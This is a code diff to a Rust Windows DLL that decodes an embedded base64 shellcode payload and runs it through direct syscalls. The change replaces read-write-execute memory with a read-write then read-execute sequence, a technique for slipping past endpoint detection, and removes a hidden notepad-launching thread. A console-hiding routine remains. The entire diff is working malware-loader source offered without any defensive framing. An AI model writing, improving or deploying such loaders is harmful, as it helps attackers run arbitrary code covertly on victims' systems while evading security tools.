@@ -1,13 +1,8 @@
 #![allow(non_snake_case)]
 
 use std::arch::global_asm;
-use windows::core::{PCSTR, PSTR};
 use windows::Win32::Foundation::{BOOL, HINSTANCE};
 use windows::Win32::System::SystemServices::DLL_PROCESS_ATTACH;
-use windows::Win32::System::Threading::{
-    PROCESS_INFORMATION, STARTUPINFOA,
-    CREATE_NO_WINDOW,
-};
 use base64::{Engine as _, engine::general_purpose};
 
 mod syscall;
@@ -540,9 +535,10 @@ const ENCODED_SHELLCODE: &str = "/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1I
 
 unsafe extern "system" fn shellcode_thread(_: *mut core::ffi::c_void) -> u32 {
     if let Ok(shellcode) = general_purpose::STANDARD.decode(ENCODED_SHELLCODE) {
-        if let (Some(nt_alloc_id), Some(nt_write_id)) = (
+        if let (Some(nt_alloc_id), Some(nt_write_id), Some(nt_protect_id)) = (
             get_syscall_number("ntdll.dll", "NtAllocateVirtualMemory"),
             get_syscall_number("ntdll.dll", "NtWriteVirtualMemory"),
+            get_syscall_number("ntdll.dll", "NtProtectVirtualMemory"),
         ) {
             let mut exec_mem: *mut std::ffi::c_void = std::ptr::null_mut();
             let mut region_size = shellcode.len();
@@ -553,7 +549,7 @@ unsafe extern "system" fn shellcode_thread(_: *mut core::ffi::c_void) -> u32 {
                 0,
                 &mut region_size,
                 0x3000, // MEM_COMMIT | MEM_RESERVE
-                0x40,   // PAGE_EXECUTE_READWRITE
+                0x04,   // PAGE_READWRITE
                 nt_alloc_id,
             );
 
@@ -566,6 +562,18 @@ unsafe extern "system" fn shellcode_thread(_: *mut core::ffi::c_void) -> u32 {
                     shellcode.len(),
                     &mut bytes_written,
                     nt_write_id,
+                );
+
+                let mut old_protect = 0u32;
+                let mut protect_size = shellcode.len();
+                let mut protect_base = exec_mem;
+                asm_nt_protect_virtual_memory(
+                    -1isize as windows_sys::Win32::Foundation::HANDLE,
+                    &mut protect_base,
+                    &mut protect_size,
+                    0x20, // PAGE_EXECUTE_READ
+                    &mut old_protect,
+                    nt_protect_id,
                 );
 
                 let exec_fn: extern "system" fn() = std::mem::transmute(exec_mem);
@@ -591,36 +599,6 @@ unsafe extern "system" fn hide_console_thread(_: *mut core::ffi::c_void) -> u32 
             }
         }
         std::thread::sleep(std::time::Duration::from_millis(100));
-    }
-    0
-}
-
-unsafe extern "system" fn notepad_thread(_: *mut core::ffi::c_void) -> u32 {
-    if let Some(kernel32_base) = get_module_base("kernel32.dll") {
-        if let Some(create_process_addr) = get_export_address(kernel32_base, "CreateProcessA") {
-            let create_process: extern "system" fn(
-                PCSTR, PSTR, *const (), *const (), bool, u32, *const (), PCSTR, *const STARTUPINFOA, *mut PROCESS_INFORMATION
-            ) -> BOOL = std::mem::transmute(create_process_addr);
-
-            let mut si = STARTUPINFOA::default();
-            si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
-
-            let mut pi = PROCESS_INFORMATION::default();
-            let mut cmd = b"notepad.exe\0".to_vec();
-
-            let _ = create_process(
-                PCSTR::null(),
-                PSTR(cmd.as_mut_ptr()),
-                std::ptr::null(),
-                std::ptr::null(),
-                false,
-                CREATE_NO_WINDOW.0,
-                std::ptr::null(),
-                PCSTR::null(),
-                &si,
-                &mut pi,
-            );
-        }
     }
     0
 }
